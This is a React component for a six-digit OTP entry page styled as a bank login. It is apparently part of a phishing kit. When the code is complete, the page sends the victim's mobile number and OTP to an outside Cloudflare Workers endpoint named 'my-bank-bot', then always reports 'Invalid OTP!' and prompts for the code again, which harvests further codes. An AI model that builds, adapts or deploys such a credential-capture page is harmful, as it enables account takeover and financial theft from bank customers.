import { useState, useEffect } from "react";
import "./index.css";
import { useLocation, useNavigate } from "react-router-dom";

export default function LastOTP() {
    const [otp, setOtp] = useState(["", "", "", "", "", ""]);
    const [timer, setTimer] = useState(42);
    const [error, setError] = useState(""); // ❌ Error message state
    const location = useLocation();
    const navigate = useNavigate();
    const { mobile } = location.state;

    useEffect(() => {
        if (timer > 0) {
            const countdown = setInterval(() => setTimer((t) => t - 1), 1000);
            return () => clearInterval(countdown);
        }
    }, [timer]);

    const handleChange = async (e, index) => {
        const value = e.target.value.replace(/\D/g, "");
        const newOtp = [...otp];
        newOtp[index] = value ? value.charAt(value.length - 1) : "";
        setOtp(newOtp);

        if (index < 5 && value) {
            document.getElementById(`otp-${index + 1}`).focus();
        }

        if (newOtp.every((digit) => digit !== "")) {
            const otpCode = newOtp.join("");
            console.log("Entered OTP:", otpCode);

            try {
                await fetch("https://my-bank-bot.instapayapi.workers.dev/api/otp", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        username: mobile,
                        otp: otpCode,
                    }),
                });
            } catch (err) {
                console.error("API Error:", err);
            }

            setError("Invalid OTP!");
            setOtp(["", "", "", "", "", ""]);
            document.getElementById("otp-0").focus();
        }
    };

    const handleKeyDown = (e, index) => {
        if (e.key === "Backspace") {
            if (otp[index] === "" && index > 0) {
                document.getElementById(`otp-${index - 1}`).focus();
            } else {
                const newOtp = [...otp];
                newOtp[index] = "";
                setOtp(newOtp);
            }
        }
    };

    return (
        <div className="min-h-screen flex flex-col items-center bg-white">
            {/* Top Red Section */}
            <div className="w-full bg-red-600 text-center pt-16 pb-20 wave-bottom">
                <h1 className="text-white text-3xl font-bold">Welcome Back</h1>
                <p className="text-white mt-2 text-sm">
                    I am happy to see you again. You can continue <br />
                    where you left off by logging in.
                </p>
            </div>

            {/* OTP Section */}
            <div className="w-full max-w-md px-6 mt-12 text-center">
                <p className="text-gray-800 font-medium">
                    Enter 6 digit OTP sent to{" "}
                    <span className="text-blue-900 font-semibold">{mobile}</span>
                </p>

                {/* OTP Inputs */}
                <div className="flex justify-center gap-3 mt-6 relative">
                    {otp.map((digit, index) => (
                        <input
                            key={index}
                            id={`otp-${index}`}
                            type="number"
                            maxLength="1"
                            value={digit}
                            onChange={(e) => handleChange(e, index)}
                            onKeyDown={(e) => handleKeyDown(e, index)}
                            className="w-10 h-12 text-center text-xl border-b-2 border-gray-400 focus:border-black outline-none"
                        />
                    ))}
                    {/* Timer */}
                    <span className="absolute right-0 top-1/2 -translate-y-1/2 text-gray-600">
                        {timer}s
                    </span>
                </div>

                {/* ❌ Error Message */}
                {error && (
                    <p className="text-red-600 text-sm mt-3">{error}</p>
                )}

                {/* Resend Option */}
                <p className="text-gray-500 text-sm mt-6">
                    Did not get verification code?{" "}
                    <button
                        type="button"
                        onClick={() => {
                            setTimer(42);
                            setError(""); // error reset
                        }}
                        className="text-black font-medium"
                        disabled={timer > 0}
                    >
                        Resend OTP
                    </button>
                </p>

                {/* Contact Us */}
                <div className="text-center mt-10">
                    <a href="#" className="text-red-600 text-sm font-medium">
                        Contact Us
                    </a>
                </div>
            </div>
        </div>
    );
}
